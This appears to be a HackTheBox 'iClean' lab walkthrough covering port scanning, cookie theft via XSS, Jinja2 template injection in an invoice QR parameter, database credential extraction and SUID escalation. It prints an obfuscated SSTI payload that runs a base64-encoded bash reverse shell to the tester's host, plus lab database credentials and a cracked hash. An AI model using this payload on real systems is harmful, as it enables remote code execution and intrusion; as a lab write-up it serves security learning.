---
layout: post
title: HTB - iClean Walkthrough
categories: [HackTheBox, Writeups]
date: 2024-08-28 09:45 +0200
media_subpath: /assets/images
---
# HTB - IClean
## Scanning

```js
# Nmap 7.94SVN scan initiated Tue Jul 16 21:00:35 2024 as: nmap -sC -sV -oA nmap/iclean -p- -vv 10.10.11.12
Nmap scan report for 10.10.11.12
Host is up, received reset ttl 63 (0.031s latency).
Scanned at 2024-07-16 21:00:36 UTC for 37s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6uGZlOYFnD/75LXrnuHZ8mODxTWsOQia+qoPaxInXoUxVV4+56Dyk1WaY2apshU+pICxXMqtFR7jb3NRNZGI4=
|   256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBnDPOYK91Zbdj8B2Q1MzqTtsc6azBJ+9CMI2E//Yyu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 16 21:01:13 2024 -- 1 IP address (1 host up) scanned in 37.88 seconds
```

Visiting the site and we get redirected to capiclean.htb so we add it to the hosts file. The site is a flask web server. There is nothing interesting on the page except a login page so I will begin to enumerate.

## Enumeration

I ran a vhost scan and a directory scan and found nothing interesting. I'm thinking of using the names found on the main page to find a valid login for someone. The only intractable thing here was a page to get a quote where you could input an email and what services you'd like. I was able to find a xss vulnerability that made it possible for me to get the cookie of whoever sees the request:

![Burp](20240723152713.png)

With the cookie set I was able to explore to the dashboard at /dashboard where I get offered a few functions

![Dashboard options](20240723152958.png)

Generate Invoice seems interesting since it is is getting stored somewhere which we can check with Generate QR. Anything that haven't been seen before by us is invalid so there is some kind of database storing these. Apparently I wasted a lot of time thinking this was sqli when it was ssti

## Exploitation

To exploit the ssti we have to attempt to generate a printable invoice that has qr_code parameter as input. If we put `{{7*7}}` in there for example we get 49 on the final page. And we can use this for shell:
{% raw %}
```
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzQvNDQ0NCAwPiYx | base64 -d | bash")["read"]() %} a {% endwith %}
```
{% endraw %}
but urlencoded ofc:

![Burp request](20240723170155.png)

## Escalation

```
/opt/app/templates/temporary_invoice.html
consuela mail /var/spool/mail /var/mail
/var/www/pmm2
```

Mysql user `iclean:pxCsmnGLckUb`

IN the database we could read the credentials of the users. Consuela had the hash `0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa`which becomes `simple and clean`. The admin hash was unknown. I was able to log in to consuelas user

The rest was pretty easy. There was a suid binary that I could use to read the root flag in some way which was this:

![Escalation](20240723175427.png)

I had to input a real pdf file so I just uploaded one from my side.
